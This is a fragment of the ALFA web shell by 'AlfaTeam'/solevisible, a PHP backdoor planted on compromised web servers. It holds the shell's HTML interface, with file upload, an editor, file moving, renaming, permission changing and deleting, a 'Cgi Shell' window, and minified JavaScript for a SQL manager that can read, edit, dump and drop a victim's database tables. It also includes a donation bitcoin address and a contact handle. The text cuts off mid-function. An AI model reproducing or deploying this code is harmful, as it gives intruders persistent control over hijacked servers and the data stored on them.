<input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./AlfaTeam &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>solevisible[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/solevisible'>@solevisible</a></span></div></td>
</tr>
</table>
</div>

<div id='options_window' style='background:rgba(0, 0, 0, 0.69);'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"options_window\");'></div><div onClick='editorClose(\"options_window\");' class='close-button'></div></div></div><div style='height:100%;' class='content_options_holder'><div class='options_tab'></div><div class='options_content' style='margin-left:14px;margin-right:30px;background:#000;overflow:auto;'></div></div></div></div>

<div id='database_window' style='background:rgba(0, 0, 0, 0.69);'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'>Sql Manager</div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"database_window\");'></div><div onClick='editorClose(\"database_window\");' class='close-button'></div></div></div><div class='content_options_holder' style='margin-left:14px;margin-right:30px;background:#000;max-height:90%;'><div class='sql-tabs'></div><div class='sql-contents' style='max-height: 85vh;'></div></div></div></div>

<div id='cgiloader'><div class='editor-wrapper'><div class='editor-header'><div class='opt-title'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"cgiloader\");'></div><div onClick='editorClose(\"cgiloader\");' class='close-button'></div></div></div><div id='cgiframe' style='position:relative;margin-left:14px;margin-right:30px;'><div class='terminal-tabs'></div><div style='height:90%;' class='terminal-contents'></div></div></div></div>
<div id='editor' style='display:none;'><div class='editor-wrapper'><div class='editor-header'><div class='editor-path'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize(\"editor\");'></div><div onClick='editorClose(\"editor\");' class='close-button'></div></div></div><div onclick='historyPanelController(this);' mode='visible' class='history-panel-controller'><<</div><div class='editor-explorer'><div class='hheader'><div class='history-clear' onclick='clearEditorHistory();'>Clear all</div><div class='hheader-text'>History</div><div class='editor-search'><input type='text' style='text-align:center;' id='search-input' placeholder='search'></div></div><div class='history-list'></div></div><div class='editor-modal'><div class='editor-body'><div class='editor-content'><div class='editor-tabs'></div><div class='editor-content-holder'></div></div></div></div></div></div>
<div id='update-content'></div>
<div id='database_window-minimized' onclick='showEditor(\"database_window\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div class='minimized-text' style='top: 15px;'>Database</div></div></div>
<div id='options_window-minimized' onclick='showEditor(\"options_window\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 4px;' class='minimized-text'>Options</div></div></div>
<div id='editor-minimized' onclick='showEditor(\"editor\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 2px;' class='minimized-text'>Editor</div></div></div>
<div id='cgiloader-minimized' onclick='showEditor(\"cgiloader\");'><div class='minimized-wrapper'><span class='options_min_badge'>0</span><div style='top: 12px;' class='minimized-text'>Cgi Shell</div></div></div>
<div id='rightclick_menu'>
  <a target='_blank' href='' name='newtab'><img src=\"http://solevisible.com/icons/menu/newtab.svg\"> Open in new tab</a>
  <a target='_blank' href='' name='link'><img src=\"http://solevisible.com/icons/menu/link.svg\"> Open file directly</a>
  <a href='javascript:void(0);' name='download'><img src=\"http://solevisible.com/icons/menu/download2.svg\"> Download</a>
  <a href='' name='view'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View Archive</a>
  <a href='' name='edit'><img src=\"http://solevisible.com/icons/menu/edit.svg\"> Edit</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"http://solevisible.com/icons/menu/move.svg\"> Move</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"http://solevisible.com/icons/menu/copy.svg\"> Copy</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"http://solevisible.com/icons/menu/rename.svg\">  Rename</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"http://solevisible.com/icons/menu/time.svg\">  Modify</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"permission\");' name='permission'><img src=\"http://solevisible.com/icons/menu/key.svg\"> Change Permissions</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"http://solevisible.com/icons/menu/resize.svg\"> Compress</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"http://solevisible.com/icons/menu/increase.svg\"> Extract</a>
  <a href='javascript:void(0);' name='delete'><img src=\"http://solevisible.com/icons/menu/delete.svg\"> Delete</a>
</div>
<div id=\"filesman-tab-full-path\"></div>
<div id='alert-area' class='alert-area'></div>
<div class='cl-popup-fixed' style='display:none;'>
	<div id='shortcutMenu-holder'>
		<div class='popup-head'></div>
			<form autocomplete='off' onSubmit='return false;'>
				<label class='old-path-lbl'></label>
				<div style='overflow: hidden;white-space: nowrap;text-overflow: ellipsis;' class='old-path-content'></div>
				<label style='margin-top:10px;' class='new-filename-lbl'>New file name</label>
				<input type='text' name='fname'>
				<div class='perm-table-holder'>
					<table>
					   <tbody>
					      <tr>
					         <td><b>Mode</b></td>
					         <td>User</td>
					         <td>Group</td>
					         <td>World</td>
					      </tr>
					      <tr>
					         <td>Read</td>
					         <td><input type='checkbox' name='ur' value='4' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='gr' value='4' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='wr' value='4' onclick='calcperm();'></td>
					      </tr><tr><td>Write</td>
					         <td><input type='checkbox' name='uw' value='2' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='gw' value='2' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='ww' value='2' onclick='calcperm();'></td>
					      </tr>
					      <tr>
					         <td>Execute</td>
					         <td><input type='checkbox' name='ux' value='1' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='gx' value='1' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='wx' value='1' onclick='calcperm();'></td>
					      </tr>
					      <tr>
					         <td>Permission</td>
					         <td><input style='width:60px;' type='text' name='u' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"u\", [\"u\"]);'></td>
					         <td><input style='width:60px;' type='text' name='g' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"g\", [\"g\"]);'></td>
					         <td><input style='width:60px;' type='text' name='w' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"w\", [\"w\"]);'></td>
					      </tr>
					   </tbody>
					</table>
				</div>

			</form>
		<div class='popup-foot'>
			<button style='background: #2b5225;' name='accept' action='' onclick='alfaPopUpDoAction(this);'></button>
			<button style='background: #9e2c2c;' onclick='d.querySelector(\".cl-popup-fixed\").style.display=\"none\";'>Cancell</button>
		</div>
	</div>
</div>";?>
<script>
function alfaMysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cache[e.db_id].user,pass:mysql_cache[e.db_id].pass,db:e.db_target,db_id:e.db_id};if(e.hasOwnProperty("db_info"))for(var i in e.db_info)a[i]=e.db_info[i];var l={a:alfab64("Sql_manager_api"),c_:alfab64(c_),alfa1:alfab64(JSON.stringify(a))};if(e.hasOwnProperty("post"))for(var i in e.post.hasOwnProperty("alfa2")&&"load_data"!=e.post.alfa2&&"page"!=e.post.alfa2&&"edit"!=e.post.alfa2&&"delete"!=e.post.alfa2&&(d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-pager").innerHTML="",d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-reporter").innerHTML=""),e.post)l[i]=alfab64(e.post[i]);var r="";for(var o in l)r+=o+"="+l[o]+"&";alfaloader(e.db_id,"block"),_Ajax(d.URL,r,function(a){alfaloader(e.db_id,"none"),t(a)},!0,e.db_id)}function alfaMysqlFilterTable(e,t){setTimeout(function(){var a="",i="",l=(a="","");if(null!=e)a=e.getAttribute("target"),i=e.getAttribute("db_id"),l=e.value;else a=t.target,i=t.db_id,l=t.value;l=new RegExp(l,"i"),d.querySelectorAll("#"+i+" "+a+" ul > li").forEach(function(e){var t=e.querySelector(".mysql_tables");if(null==t)return!1;-1==(t=t.innerText).search(l)?e.style.display="none":e.style.display="block"})},200)}function alfaMysqlFilterAllTable(e,t){var a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" .mysql-tables input[name=filter_all]").value,l=d.querySelector("#"+a+" input[name=sql_count]").checked,r=[],o=[];if(d.querySelectorAll("#"+a+" .mysql-tables .list_container").forEach(function(e){var t=e.getAttribute("mode"),a=e.getAttribute("db_name");"no"==t&&r.push(a),o.push(a)}),r.length>0){if(0==i.length&&void 0===t)return!1;alfaMysqlApi({db_id:a,db_target:r[0],ajax_id:"mysql_get_all_tables",db_info:{databases:r},post:{alfa2:"load_all_tables",alfa3:l}},function(r){if(0!=r.length){for(var o in r=JSON.parse(r)){var n=o,s=d.querySelector("#"+a+" .cls-"+n);alfaMysqlMakeTblList(r[o],s,a,n,l)}void 0===t?alfaMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}):(e.setAttribute("mode","opened"),d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/b_minus.png")}})}else if(void 0===t)for(var n in alfaMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}),o)alfaMysqlTableMode(a,o[n],"closed");else{var s="",c=e.getAttribute("mode");for(var n in"opened"==c?(e.setAttribute("mode","closed"),s="b_plus.png"):(e.setAttribute("mode","opened"),s="b_minus.png"),o)alfaMysqlTableMode(a,o[n],c);d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/"+s}}function alfaMysqlTableMode(e,t,a){var i=d.querySelector("#"+e+" .cls-"+t),l="";void 0===a?(l=-1!=i.classList.value.indexOf("hide-db-tables")?"b_minus.png":"b_plus.png",i.classList.toggle("hide-db-tables")):"opened"==a?(l="b_plus.png",i.classList.add("hide-db-tables")):(l="b_minus.png",i.classList.remove("hide-db-tables")),d.querySelector("#"+e+" .cls-"+t+"-expander img").src="http://solevisible.com/icons/menu/"+l}function alfaMysqlExpander(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=e.getAttribute("sql_count"),l=d.querySelector("#"+a+" .cls-"+t);"loaded"==l.getAttribute("mode")?alfaMysqlTableMode(a,t):alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_get_tables",post:{alfa2:"load_tables",alfa3:i}},function(e){0!=e.length&&alfaMysqlMakeTblList(e=JSON.parse(e),l,a,t,i)})}function alfaMysqlTablesEvil(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i=e.getAttribute("mode");"checked"==i?(i=!1,e.setAttribute("mode","not")):(i=!0,e.setAttribute("mode","checked")),d.querySelectorAll("#"+a+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked=i})}function alfaMysqlTablesDumpDrop(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i="none";"dump"==e.value&&(i="block"),d.querySelector("#"+a+" "+t+" .dump-file-holder").style.display=i}function alfaMysqlTablesDumpDropBtn(e){var t=e.getAttribute("target"),a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=[],r=d.querySelector("#"+i+" input[name=sql_count]").checked,o=d.querySelector("#"+i+""+t),n=o.querySelector("select[name=tables_evil]").value,s=o.querySelector(".dump-file-holder input").value;d.querySelectorAll("#"+i+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked&&l.push(e.value)}),l.length>0&&alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_query_evil",db_info:{tables:l,mode:n,dump_file:s},post:{alfa2:"dump_drop"}},function(e){0!=e.length&&(e=JSON.parse(e),"drop"==n?alfaMysqlMakeTblList(e,o,i,a,r):o.querySelector(".dump-file-holder").insertAdjacentHTML("beforeend","<div><a href='javascript:void(0);' onclick='g(\"FilesTools\",null,\""+s+'","download");\'><span>Download: '+s+"</span></a></div>"))})}function alfaMysqlMakeTblList(e,t,a,i,l){t.setAttribute("mode","loaded");var r='<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" db_id="'+a+'" placeholder="Filter Table" target=".cls-'+i+'" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';for(var o in e)null!=e[o]&&(r+="<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='"+e[o].name+"'>&nbsp;<a class='db-opt-id' db_target='"+i+"' db_id='"+a+"' href='javascript:void(0);' onclick=\"alfaLoadTableData(this, '"+e[o].name+"')\"><span class='mysql_tables' style='font-weight:unset;'>"+e[o].name+"</span></a>"+(l?" <small><span style='font-weight:unset;' class='mysql_table_count'>("+e[o].count+")</span></small>":"&nbsp;")+"</div></li>");r+='</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="alfaMysqlTablesEvil(this);" db_id="'+a+'" class="db-opt-id" target=".cls-'+i+'" type="checkbox" class="db-opt-id"><select onchange="alfaMysqlTablesDumpDrop(this);" class="db-opt-id" db_id="'+a+'" target=".cls-'+i+'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="alfaMysqlTablesDumpDropBtn(this);return false;" db_id="'+a+'" class="db-opt-id" db_target="'+i+'" target=".cls-'+i+'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>',t.innerHTML=r,d.querySelector("#"+a+" .cls-"+i+"-expander img").src="http://solevisible.com/icons/menu/b_minus.png"}function alfaMysqlQuery(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" textarea[name=query]").value;alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_load_query_data",db_info:{query:i},post:{alfa2:"query"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.status?e.table:"",alfaMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0))})}function alfaMysqlReportBuilder(e,t){var a="";t.status||(a="<div><span>Error: </span><div style='padding-left: 50px;'><pre>"+t.error+"</pre></div></div>");var i="<div><span>Query:</span><div style='padding-left: 50px;'><pre>"+t.query+"</pre></div>"+a+"</div>";d.querySelector("#"+e+" .mysql-query-reporter").innerHTML=i}function alfaMysqlTablePanelCtl(e){var t=e.getAttribute("db_id"),a=(t=e.getAttribute("db_id"),d.querySelector("#"+t)),i=a.querySelector(".tables-panel-ctl");"none"==i.getAttribute("mode")?(a.querySelector(".mysql-tables").style.display="block",i.setAttribute("mode","block"),i.innerHTML="&#x3C;&#x3C;",a.querySelector(".mysql-query-results-fixed").classList.remove("mysql-query-results-fixed")):(a.querySelector(".mysql-tables").style.display="none",i.setAttribute("mode","none"),i.innerHTML="&#x3E;&#x3E;",a.querySelector(".mysql-query-results").classList.add("mysql-query-results-fixed")),i.classList.toggle("tables-panel-ctl-min")}function alfaMysqlTabCtl(e,t){var a=void 0===t?e.getAttribute("db_id"):e.db_id,i=void 0===t?e.getAttribute("target"):e.target;d.querySelectorAll("#"+a+" .mysql-query-content").forEach(function(e){e.classList.add("mysql-hide-content")}),d.querySelector("#"+a+" .mysql-query-result-tabs .mysql-query-selected-tab").classList.remove("mysql-query-selected-tab"),void 0===t?e.classList.add("mysql-query-selected-tab"):d.querySelector("#"+a+" .mysql-query-result-tabs div:nth-child("+e.child+")").classList.add("mysql-query-selected-tab"),d.querySelector("#"+a+" "+i).classList.remove("mysql-hide-content")}function alfaLoadTableData(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id");alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_load_table_data",db_info:{table:t},post:{alfa2:"load_data"}},function(e){if(0!=e.length){e=JSON.parse(e);var l="",r="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>",o="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th><th>Change</th></tr>",n="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Collation</th><th>Operator</th><th>Value</th></tr>",s=["int","smallint","bigint","tinyint","mediumint"],c=["longtext","text","mediumtext","tinytext"];for(var u in e.columns){var p="text";-1!=s.indexOf(e.columns[u].data_type)&&(p="number"),n+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+e.columns[u].collation+"</td><td><select name='"+e.columns[u].name+"'><option value='='>=</option><option value='!='>!=</option><option value='>'>&gt;</option><option value='>='>&gt;=</option><option value='<'>&lt;</option><option value='<='>&lt;=</option><option value=\"= ''\">= ''</option><option value=\"!= ''\">!= ''</option><option value='LIKE'>LIKE</option><option value='LIKE %...%'>LIKE %...%</option><option value='NOT LIKE'>NOT LIKE</option><option value='REGEXP'>REGEXP</option><option value='REGEXP ^...$'>REGEXP ^...$</option><option value='NOT REGEXP'>NOT REGEXP</option><option value='IN (...)'>IN (...)</option><option value='NOT IN (...)'>NOT IN (...)</option><option value='BETWEEN'>BETWEEN</option><option value='NOT BETWEEN'>NOT BETWEEN</option><option value='IS NULL'>IS NULL</option><option value='IS NOT NULL'>IS NOT NULL</option></select></td><td><input type='"+p+"' name='"+e.columns[u].name+"'></td></tr>";var f=alfaMysqlLoadDataType(e.columns[u].data_type);null==e.columns[u].type_value&&(e.columns[u].type_value=""),o+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td><select name='sel_"+e.columns[u].name+"'>"+f+"</select></td><td><input name='value_"+e.columns[u].name+"' type='text' value='"+(-1==c.indexOf(e.columns[u].data_type)?e.columns[u].type_value:"")+"'></td><td><button col_name='"+e.columns[u].name+"' tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlAlterTbl(this);return false;'>Change</button></td></tr>";var m="";switch(e.columns[u].data_type){case"longtext":case"text":m="<textarea name='"+e.columns[u].name+"' rows='5'></textarea>";break;case"int":case"smallint":case"bigint":m="<input type='number' name='"+e.columns[u].name+"' value=''>";break;default:m="<input type='text' name='"+e.columns[u].name+"' value=''>"}r+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+m+"</td></tr>"}if(r+="</table><div style='margin-left:20px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlUpdateRow(this, \"insert\");return false;'>Insert</button></div><div class='mysql-insert-result'></div>",o+="</table><div class='mysql-structure-qres'></div>",n+="</table><div style='padding-left: 384px;margin-top: 15px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlSearch(this);return false;'>Search</button></div>",e.pages>0){l+="<span style='cursor:pointer;' db_id='"+i+"' onclick='alfaMysqlChangePage(this,1);'><<</span> <span> page: </span> <select tbl_name='"+t+"' db_target='"+a+"' name='mysql-q-pages' db_id='"+i+"' class='db-opt-id' onchange='alfaMysqlChangePage(this);' pages='"+e.pages+"'>";for(var b=1;b<e.pages+1;b++)l+="<option>"+b+"</option>";l+="</select><span> Of "+e.pages+"</span> <span style='cursor:pointer;' db_id='"+i+"' onclick='alfaMysqlChangePage(this,2);'>>></span>"}var y=d.querySelector("#"+i);y.querySelector(".mysql-search-area").innerHTML=n,y.querySelector(".mysql-insert-row").innerHTML=r,y.querySelector(".mysql-edit-row").innerHTML="",y.querySelector(".mysql-structure").innerHTML=o,y.querySelector(".mysql-query-result-header .mysql-query-pager").innerHTML=l,y.querySelector(".mysql-query-table").innerHTML=e.status?e.table:"",alfaMysqlTabCtl({child:1,db_id:i,target:".mysql-query-result-content"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="none",alfaMysqlReportBuilder(i,e)}})}function alfaMysqlAlterTbl(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r=e.getAttribute("col_name"),o={};o.type=i.querySelector(".mysql-structure select[name=sel_"+r+"]").value,o.input=i.querySelector(".mysql-structure input[name=value_"+r+"]").value,alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_alter",db_info:{table:l,column:r,alter:o},post:{alfa2:"alter"}},function(e){var t=d.querySelector("#"+a+" .mysql-structure-qres");t.innerHTML=e,t.style.display="block"})}function alfaMysqlSearch(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r={};i.querySelectorAll(".mysql-search-area input, .mysql-search-area select").forEach(function(e){r.hasOwnProperty(e.name)||(r[e.name]={}),"SELECT"==e.tagName?r[e.name].opt=e.value:r[e.name].value=e.value}),alfaMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_search_query",db_info:{table:l,search:r},post:{alfa2:"search"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),alfaMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function alfaMysqlEditRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=(d.querySelector("#"+i),e.getAttribute("col_key")),r=e.getAttribute("key"),o=e.getAttribute("tbl_name"),n=e.getAttribute("row_id");alfaMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_table_edit_query",db_info:{table:o,col_key:l,key:r},post:{alfa2:t}},function(e){if(0!=e.length)if(e=JSON.parse(e),"edit"==t){var s="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>";for(var c in e){var u="";switch(e[c].type.tag){case"textarea":u="<textarea name='"+e[c].col+"' rows='5'>"+e[c].value+"</textarea>";break;case"input":u="<input type='"+e[c].type.type+"' name='"+e[c].col+"' value='"+e[c].value+"'>"}s+="<tr><th style='text-align: left;'>"+e[c].col+"</th><td>"+e[c].type.col_type+"</td><td>"+u+"</td></tr>"}s+="</table><div style='margin-left:20px;'><button col_key='"+l+"' key='"+r+"' tbl_name='"+o+"' db_id='"+i+"' db_target='"+a+"' onclick='alfaMysqlUpdateRow(this, \"edit\");return false;'>Update</button></div><div class='mysql-update-result'></div>",d.querySelector("#"+i+" .mysql-edit-row").innerHTML=s,alfaMysqlTabCtl({child:6,db_id:i,target:".mysql-edit-row"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="inline-block"}else"delete"==t&&(e.status?d.querySelector("#"+i+" .tbl_row_l"+n).remove():alert(e.error))})}function alfaMysqlTblSelectAll(e){var t=e.getAttribute("db_id");d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(t){t.checked=e.checked})}function alfaMysqlDeleteAllSelectedrows(e){var t=e.getAttribute("db_id"),a=e.getAttribute("db_target"),i=e.getAttribute("col_key"),l=e.getAttribute("tbl_name"),r=[];if(d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&r.push(e.value)}),0==r.length)return!1;alfaMysqlApi({db_id:t,db_target:a,ajax_id:"mysql_table_delete_all_query",db_info:{table:l,col_key:i,rows:r},post:{alfa2:"delete_all"}},function(e){if(""!=e)if((e=JSON.parse(e)).status){var a=0,i=d.querySelector("#"+t);d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&(a=e.getAttribute("row_id"),i.querySelector(".tbl_row_l"+a).remove())})}else alert(e.error)})}function alfaMysqlUpdateRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=d.querySelector("#"+i),r=".mysql-insert-row",o=".mysql-insert-result",n="mysql_table_insert_query",s="insert",c={table:e.getAttribute("tbl_name")};if("edit"==t){var u=e.getAttribute("col_key"),p=e.getAttribute("key");r=".mysql-edit-row",o=".mysql-update-result",n="mysql_table_update_query",s="update",c.col_key=u,c.key=p}var f={};l.querySelectorAll(r+" input, "+r+" textarea").forEach(function(e){f.hasOwnProperty(e.name)||(f[e.name]={}),f[e.name]=e.value}),c.data=f,alfaMysqlApi({db_id:i,db_target:a,ajax_id:n,db_info:c,post:{alfa2:s}},function(e){if(0!=e.length){e=JSON.parse(e);var t=d.querySelector("#"+i+" "+o);t.style.display="block",e.status?t.innerHTML="Success...":t.innerHTML=e.error}})}function alfaMysqlLoadDataType(e){e=e.toUpperCase();var t=["INT","VARCHAR","TEXT","DATE",{key:"Numeric",vals:["TINYINT","SMALLINT","MEDIUMINT","INT","BIGINT","-","DECIMAL","FLOAT","DOUBLE","REAL","-","BIT","BOOLEAN","SERIAL"]},{key:"Date and time",vals:["DATE","DATETIME","TIMESTAMP","TIME","YEAR"]},{key:"String",vals:["CHAR","VARCHAR","-","TINYTEXT","TEXT","MEDIUMTEXT","LONGTEXT","-","BINARY","VARBINARY","-","TINYBLOB","MEDIUMBLOB","BLOB","LONGBLOB","-","ENUM","SET"]},{key:"Spatial",vals:["GEOMETRY","POINT","LINESTRING","POLYGON","MULTIPOINT","MULTILINESTRING","MULTIPOLYGON","GEOMETRYCOLLECTION"]},{key:"JSON",vals:["JSON"]}],a="",i=!1;for(var l in t)if("object"==typeof t[l]){for(var r in a+='<optgroup label="'+t[l].key+'">',t[l].vals)a+="<option"+(t[l].vals[r]!=e||i?"":" selected")+">"+t[l].vals[r]+"</option>",t[l].vals[r]==e&&(i=!0);a+="</optgroup>"}else a+="<option"+(t[l]!=e||i?"":" selected")+">"+t[l]+"</option>",t[l]==e&&(i=!0);return a}function alfaMysqlChangePage(e,t){var a=e.getAttribute("db_id"),i=0;if(void 0!==t){e=d.querySelector("#"+a+" select[name=mysql-q-pages]");var l=parseInt(e.getAttribute("pages"));if(i=parseInt(e.value),1==t?--i:++i,0==i||l<i)return!1;e.value=i}else i=e.value;var r=e.getAttribute("db_target"),o=e.getAttribute("tbl_name");alfaMysqlApi({db_id:a,db_target:r,ajax_id:"mysql_table_change_page",db_info:{table:o,page:i},post:{alfa2:"page"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function alfaRemoveCookie(e){document.cookie=e+"=;Max-Age=0; path=/;"}function alfaLogOut(){alfaRemoveCookie("AlfaUser"),alfaRemoveCookie("AlfaPass"),location.reload()}var alfaAlertBox=function(e,t){this.types={success:{class:"alert-success",icon:"http://solevisible.com/icons/menu/check-mark1.svg"},error:{class:"alert-error",icon:"http://solevisible.com/icons/menu/warning.svg"}},this.show=function(a){if(""===a||null==a)throw'"msg parameter is empty"';var i=document.querySelector(e),l=document.createElement("DIV"),r=document.createElement("DIV"),o=document.createElement("DIV"),n=document.createElement("A"),s=document.createElement("div"),c=document.createElement("IMG"),d=this;if(s.style.display="inline-block",s.style.marginRight="10px",r.style.display="inline-block",o.classList.add("alert-content"),o.innerText=a,n.classList.add("alert-close"),n.setAttribute("href","#"),l.classList.add("alert-box"),c.src=this.types[t.type].icon,c.style.width="30px",s.appendChild(c),l.appendChild(s),t.hasOwnProperty("title")){var u=document.createElement("DIV");u.classList.add("alert-content-title"),u.innerText=t.title,r.appendChild(u)}if(r.appendChild(o),l.appendChild(r),t.hideCloseButton&&void 0!==t.hideCloseButton||l.appendChild(n),t.hasOwnProperty("type")&&l.classList.add(this.types[t.type].class),i.appendChild(l),n.addEventListener("click",function(e){e.preventDefault(),d.hide(l)}),!t.persistent)var p=setTimeout(function(){d.hide(l),clearTimeout(p)},t.closeTime)},this.hide=function(e){e.classList.add("hide");var t=setTimeout(function(){e.parentNode.removeChild(e),clearTimeout(t)},500)}};function alfaShowNotification(e,t,a,i,l){void 0===a&&(a="success"),void 0===i&&(i=!1),void 0===l&&(l=1e4);var r={closeTime:l,persistent:i,type:a,hideCloseButton:!1};void 0!==t&&(r.title=t),new alfaAlertBox("#alert-area",r).show(e)}function alfaSyncMenuToOpt(e,t){var a="",i="",l=null;void 